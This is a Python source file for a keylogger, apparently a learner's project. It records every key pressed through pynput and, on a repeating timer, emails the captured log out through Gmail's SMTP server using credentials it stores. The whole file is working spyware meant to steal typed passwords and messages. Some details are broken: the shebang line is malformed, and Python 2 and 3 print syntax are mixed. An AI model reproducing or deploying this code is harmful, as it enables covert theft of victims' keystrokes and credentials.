#!/usr/binenv python
import pynput,smtplib
from threading import Timer

class Keylogger:
    def __init__(self, time_interval,sender_email,password):
        self.log = ""
        self.time_interval = time_interval
        self.sender_email = sender_email
        self.password = password
        print("We are in constructor method")

    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_process(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key==key.space:
                current_key = " "
            else:
                current_key = " " + str(key)
        self.append_to_log(str(current_key))

    def send_email(self, SENDER_EMAIL,PASSWORD,MESSAGE):
        try:
            server = smtplib.SMTP("smtp.gmail.com",587)
            server.starttls()
            server.login(SENDER_EMAIL,PASSWORD)
            message = """From: %s\nTo: %s\nSubject: %s\n\n%s""" % (SENDER_EMAIL, ", ".join(SENDER_EMAIL), "LOGS", MESSAGE)
            server.sendmail(SENDER_EMAIL,SENDER_EMAIL,message)
            server.quit()
            print 'successfully sent the mail'
        except:
            print "failed to send mail"


    def report(self):
        print(self.log)
        self.send_email(self.sender_email,self.password,self.log)
        self.log = ""
        Timer_time_func = Timer(self.time_interval, self.report)
        Timer_time_func.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.process_key_process) as keyboard_listener:
            self.report()
            keyboard_listener.join()


